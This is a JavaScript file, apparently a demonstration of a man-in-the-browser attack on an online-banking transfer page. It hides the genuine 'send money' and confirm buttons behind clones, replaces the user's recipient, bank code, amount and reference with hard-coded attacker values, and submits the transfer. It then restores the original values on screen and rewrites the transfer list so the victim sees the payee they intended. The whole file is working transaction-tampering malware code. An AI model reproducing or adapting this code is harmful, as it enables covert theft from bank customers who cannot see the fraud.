
HACK_REC_ACCOUNT	="999666999";
HACK_REC_NAME		="Hack the Bank";
HACK_BANK_BLZ		="12060000";
HACK_BANK_NAME		="Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Hack Demo";
globalRC_Acc_Name="Rewe Koeln";
globalRC_Acc_Nr="725 826 262"
globalRC_Bank_BLZ="230 000 00";
globalRC_Bank_Name="Postbank"
global_Amount="34,50";
global_Usage="Vielen Dank fuer Ihren Einkauf";



	

	 function timedMsg()
		 {
		 
		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')",wndContext).each(function(){		 					 			
		 			$(this).attr("hackMarker","true");
		 			sendMoneyBtnClone=$(this).clone(true)
		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
		 			$(this).after(sendMoneyBtnClone);
		 			$(this).hide();
		 			$(this).attr("hackMarkerBtnOrig","true");		 			
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault(); 
		 				 globalRC_Acc_Nr=$("input:eq(1)",wndContext).val();
		 				 globalRC_Acc_Name=$("input:eq(2)",wndContext).val();
		 				 globalRC_Bank_BLZ=$("input:eq(3)",wndContext).val();
		 				 globalRC_Bank_Name=$("input:eq(4)",wndContext).val();
		 				 global_Amount=$("input:eq(5)",wndContext).val();
		 				 global_Usage=$("input:eq(6)",wndContext).val();
		 				 
		 				$("input:eq(1)",wndContext).val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)",wndContext).val(HACK_REC_NAME);
		 				$("input:eq(3)",wndContext).val(HACK_BANK_BLZ);
		 				$("input:eq(4)",wndContext).val(HACK_BANK_NAME);
		 				$("input:eq(5)",wndContext).val(HACK_AMOUNT);
		 				$("input:eq(6)",wndContext).val(HACK_USAGE);
		 				sendMoneyBtnClone.attr("activateReset","true");
		 				$("button[hackMarkerBtnOrig='true']",wndContext).click();
		 				$(this).hide();
		 				});			
		 			
		 	});
		 	
		 	$("#btnTD button[hName='sendMoneyBtnClone']",wndContext).filter(":not(:visible)[activateReset='true']").each(function(){		 		
		 		$("input:eq(1)",wndContext).val(globalRC_Acc_Nr);
				$("input:eq(2)",wndContext).val(globalRC_Acc_Name);
				$("input:eq(3)",wndContext).val(globalRC_Bank_BLZ);
				$("input:eq(4)",wndContext).val(globalRC_Bank_Name);
				$("input:eq(5)",wndContext).val(global_Amount);
				$("input:eq(6)",wndContext).val(global_Usage);
				 
		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')",wndContext).each(function(){
		 		$(this).attr("hackMarker","true");
	 			sendMoneyConfirmBtnClone=$(this).clone(true)
	 			$(this).after(sendMoneyConfirmBtnClone);
	 			$(this).hide();
	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
	 			sendMoneyConfirmBtnClone.click(function(event) {
	 				$("input:eq(1)",wndContext).val(HACK_REC_ACCOUNT);
	 				$("input:eq(2)",wndContext).val(HACK_REC_NAME);
	 				$("input:eq(3)",wndContext).val(HACK_BANK_BLZ);
	 				$("input:eq(4)",wndContext).val(HACK_BANK_NAME);
	 				$("input:eq(5)",wndContext).val(HACK_AMOUNT);
	 				$("input:eq(6)",wndContext).val(HACK_USAGE);
	 				$("button[hackMarkerConfirmBtnOrig='true']",wndContext).click();
	 				$("input:eq(1)",wndContext).val(globalRC_Acc_Nr);
					$("input:eq(2)",wndContext).val(globalRC_Acc_Name);
					$("input:eq(3)",wndContext).val(globalRC_Bank_BLZ);
					$("input:eq(4)",wndContext).val(globalRC_Bank_Name);
					$("input:eq(5)",wndContext).val(global_Amount);
					$("input:eq(6)",wndContext).val(global_Usage);

	 				});
	 			
		 	});
		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
		 	$(".TransfersOdd,.TransfersEven",wndContext).filter(':contains(Hack the Bank)').text(recText);		 	
		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
		 	$(".TransfersOdd,.TransfersEven",wndContext).filter(':contains(Bad Bank)').text(bankText);
		 	$(".TransfersOdd,.TransfersEven",wndContext).filter(':contains(12060000)').text(globalRC_Bank_BLZ);
		 	$(".TransfersOdd,.TransfersEven",wndContext).filter(':contains(Hack Demo)').text(global_Usage);
		 	$(".TransfersOdd,.TransfersEven",wndContext).filter(':contains(500)').text(global_Amount);
		 	
		 	
		 	
		 	
		 	var t=setTimeout(timedMsg,400);
		 }
	 
	 function attackStart(windowCtx){
		wndContext=windowCtx.document;		
	
		 $(document,wndContext).ready(function() {		 	
 			timedMsg();
	 	});
  	}

 
 
 